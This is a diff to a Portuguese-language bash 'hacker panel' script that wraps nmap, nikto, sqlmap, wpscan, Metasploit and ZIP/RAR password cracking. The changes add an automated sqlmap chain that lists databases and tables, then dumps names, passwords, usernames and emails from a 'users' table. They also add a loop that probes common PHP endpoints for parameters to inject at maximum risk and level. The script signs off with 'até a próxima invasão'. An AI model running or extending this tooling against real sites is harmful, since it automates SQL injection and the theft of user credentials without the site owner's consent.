@@ -57,11 +57,12 @@ echo -e "${cyan}─────────────────────�
 echo -e "${cyan}[1]${reset} 🔎 Escanear Vulnerabilidades (nmap + nikto)"
 echo -e "${cyan}[2]${reset} 🌐 Detectar Tecnologias (whatweb)"
 echo -e "${cyan}[3]${reset} 💉 Testar SQL Injection (sqlmap)"
-echo -e "${cyan}[4]${reset} 🗃️  Listar Bancos de Dados (sqlmap)"
+echo -e "${cyan}[4]${reset} 🗃️  Listar e Explorar Banco de Dados (sqlmap - avançado)"
 echo -e "${cyan}[5]${reset} 📧 Caça e-mails/domínios (theHarvester)"
 echo -e "${cyan}[6]${reset} 🔧 Scan WordPress (wpscan)"
 echo -e "${cyan}[7]${reset} 🧠 Metasploit Handler (Payload automático)"
 echo -e "${cyan}[8]${reset} 🔓 Quebrar senha ZIP/RAR (fcrackzip/unrar)"
+echo -e "${cyan}[9]${reset} 🔎 Explorar URL e sugerir parâmetros vulneráveis"
 echo -e "${cyan}[0]${reset} 🚪 Sair do Painel"
 echo -e "${cyan}─────────────────────────────────────────────${reset}"
 
@@ -69,13 +70,12 @@ echo -e "${cyan}─────────────────────�
 read -p $'\nDigite a opção desejada: ' op
 echo
 
-# Processamento de opções
 case $op in
   1)
-    read -p "Alvo (IP ou domínio): " alvo
-    echo -e "${yellow}Iniciando NMAP + Nikto...${reset}"
-    nmap -sV -A "$alvo"
-    nikto -h "$alvo"
+    read -p "Alvo (IP ou domínio - sem https): " alvo
+    echo -e "${yellow}Iniciando NMAP (modo agressivo) + Nikto...${reset}"
+    nmap -T5 -A "$alvo"
+    nikto -h https://"$alvo"
     ;;
   2)
     read -p "URL do site: " url
@@ -87,7 +87,17 @@ case $op in
     ;;
   4)
     read -p "URL vulnerável: " url
+    echo -e "${yellow}Buscando bancos de dados...${reset}"
     sqlmap -u "$url" --dbs --batch
+
+    echo -e "${yellow}Prosseguindo com banco de dados 'acuart'...${reset}"
+    sqlmap -u "$url" -D acuart --tables --batch
+
+    echo -e "${yellow}Listando colunas da tabela 'users'...${reset}"
+    sqlmap -u "$url" -D acuart -T users --columns --batch
+
+    echo -e "${yellow}Extraindo dados da tabela 'users' (colunas: name, pass, uname, email)...${reset}"
+    sqlmap -u "$url" -D acuart -T users -C name,pass,uname,email --dump --batch
     ;;
   5)
     read -p "Domínio alvo: " dominio
@@ -115,6 +125,32 @@ case $op in
     else
       echo -e "${red}Formato não suportado. Use .zip ou .rar${reset}"
     fi
+    ;;
+  9)
+    read -p "URL base para exploração (ex: https://site.com): " baseurl
+    echo -e "${yellow}Buscando endpoints comuns...${reset}"
+
+    caminhos=(
+      "/listproducts.php?cat=1"
+      "/index.php?id=1"
+      "/product.php?item=1"
+      "/page.php?page=1"
+      "/shop.php?category=1"
+    )
+
+    for path in "${caminhos[@]}"; do
+      full="$baseurl$path"
+      status=$(curl -s -o /dev/null -w "%{http_code}" "$full")
+      if [[ "$status" == "200" ]]; then
+        echo -e "${green}[+] Encontrado: $path (status 200)${reset}"
+        read -p "Deseja testar com SQLMap este endpoint? (s/n): " escolha
+        if [[ "$escolha" == "s" ]]; then
+          sqlmap -u "$full" --batch --risk=3 --level=5
+        fi
+      else
+        echo -e "${red}[-] Ignorado: $path (status $status)${reset}"
+      fi
+    done
     ;;
   0)
     echo -e "${red}Encerrando sessão, hacker... Até a próxima invasão!${reset}"
